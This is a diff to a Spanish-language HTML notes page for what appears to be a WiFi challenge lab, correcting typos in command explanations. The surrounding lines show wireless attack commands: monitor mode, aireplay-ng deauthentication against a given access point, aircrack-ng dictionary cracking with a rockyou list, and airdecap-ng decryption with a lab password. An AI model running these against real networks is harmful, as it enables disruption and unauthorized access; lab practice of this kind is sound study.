@@ -24,7 +24,7 @@
             <main class="container">
                 <!-- Sección de apuntes -->
                 <section class="notes-section">
-                    <h2>Desafíos de Wifi</h2>
+                    <h2>Wifi Challenge Lab v2.1</h2>
 
                     <div class="expandable-card">
                         <div class="card-header" onclick="toggleCard(this)">
@@ -44,7 +44,7 @@
                         <div class="card-content">
                             <p>Los comandos utilizados han sido:</p>
                             <p>
-                                <b>airmong-ng start wlan0:</b> Pone la interfaz de red (wlan0) en modo promiscuo/monitor
+                                <b>airmon-ng start wlan0:</b> Pone la interfaz de red (wlan0) en modo promiscuo/monitor
                             </p>
                             <p>
                                 <b>airodump-ng wlan0mon --band abg:</b> Captura/Muestra el trafico de todas las wifis
@@ -234,9 +234,7 @@ dhclient wlan1 -v</pre
                             <pre>
 airodump-ng wlan0mon -c 6 --wps -w scan8
 aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon
-aircrack-ng scan8-01.cap -w /root/rockyou-top100000.txt
-                        </pre
-                            >
+aircrack-ng scan8-01.cap -w /root/rockyou-top100000.txt</pre>
                         </div>
                     </div>
 
@@ -248,7 +246,7 @@ aircrack-ng scan8-01.cap -w /root/rockyou-top100000.txt
                             <p>Los comandos utilizados han sido:</p>
                             <p>
                                 <b>airodump-ng wlan0mon -c 6 --wps -w scan9:</b> Captura/Muestra el trafico de las redes
-                                en el canal 6 y lo guarda en archivos llamados scan8.
+                                en el canal 6 y lo guarda en archivos llamados scan9.
                             </p>
                             <p>
                                 <b>airdecap-ng -e wifi-mobile -p starwars1 scan9-01.cap:</b> Captura y desencripta el
@@ -274,7 +272,7 @@ En wireshark buscaremos todas las peeticiones que tengan como destino puerto 80,
                             <p>Los comandos utilizados han sido:</p>
                             <p>
                                 <b>airodump-ng wlan0mon -c 6 --wps -w scan10:</b> Captura/Muestra el trafico de las
-                                redes en el canal 6 y lo guarda en archivos llamados scan8.
+                                redes en el canal 6 y lo guarda en archivos llamados scan10.
                             </p>
                             <p>
                                 <b>aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon:</b> Captura y desencripta el trafico
